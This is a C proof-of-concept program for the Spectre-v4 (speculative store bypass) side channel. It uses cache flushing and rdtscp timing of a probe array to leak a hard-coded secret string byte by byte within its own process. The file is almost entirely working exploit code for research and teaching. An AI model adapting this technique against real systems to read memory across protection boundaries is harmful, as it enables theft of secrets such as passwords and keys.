#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#define LEN 8
#define MAX_TRIES 100
#define CACHE_HIT_THRESHOLD 79

unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD";
unsigned char public_key[] = "########";

uint8_t probe[256 * 64];
volatile uint8_t tmp = 0;


void victim_function(size_t idx) {
  unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
  *memory_slot_slow_ptr = public_key;
tmp = probe[(*memory_slot)[idx] * 64];
}
void attacker_function() {
  char password[LEN + 1] = {'\0'};
  for (int idx = 0; idx < LEN; ++idx) {
      int results[256] = {0};
      unsigned int junk = 0;
      for (int tries = 0; tries < MAX_TRIES; tries++) {

      *memory_slot_ptr = memory_slot;
      *memory_slot = secret_key;
      
       _mm_clflush(memory_slot_ptr);
      for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe[i * 64]);
      }
      _mm_mfence();
      victim_function(idx);
      for (int i = 0; i < 256; i++) {
        volatile uint8_t* addr = &probe[i * 64];
        uint64_t time1 = __rdtscp(&junk); 
        junk = *addr; // memory access to time
        uint64_t time2 = __rdtscp(&junk) - time1; // read timer and compute elapsed time
        // printf("%d,%ld\n",i,time2);
        if (time2 <= CACHE_HIT_THRESHOLD && i != public_key[idx]) {
          results[i]++; // cache hit
        }
      }
    }
       
      uint8_t output[2] = {0, 0};
      uint64_t hitArray[2] = {0, 0};
    for (uint64_t i = 0; i < 256; ++i) {
        if (results[i] > hitArray[0]) {
            hitArray[1] = hitArray[0]; hitArray[0] = results[i];
            output[1] = output[0]; output[0] = i;
        }
        else if (results[i] > hitArray[1]) {
            hitArray[1] = results[i]; output[1] = i;
        }
    }
//tmp ^= junk; // use junk so code above won’t get optimized out
        if(output[0] == (int)secret_key[idx] || output[1] == (int)secret_key[idx]) 
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(public_key+idx), secret_key[idx], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]); 
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(public_key+idx), secret_key[idx], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]);  

  //   int highest = -1;
  //   for (int i = 0; i < 256; i++) {
  //     if (highest < 0 || results[highest] < results[i]) {
  //       highest = i;
  //     }
  //   }
  // if(highest == (int)secret_key[idx]) 
  //       printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c)\033[m\n", 
  //       (uint8_t*)( public_key+idx), secret_key[idx],results[highest],highest, highest); 
  //       else 
  //       printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c)\033[m\n", 
  //        (uint8_t*)( public_key+idx), secret_key[idx],results[highest],highest, highest);

  }
  // printf("%s\n", password);
}

int main(void) {
  printf("This is a POC of Spectre-v4 (storeBypass)\n");
  printf("the secret key is:%s \n", secret_key);
  for (int i = 0; i < sizeof(probe); ++i) {
    probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
  }
  attacker_function();
}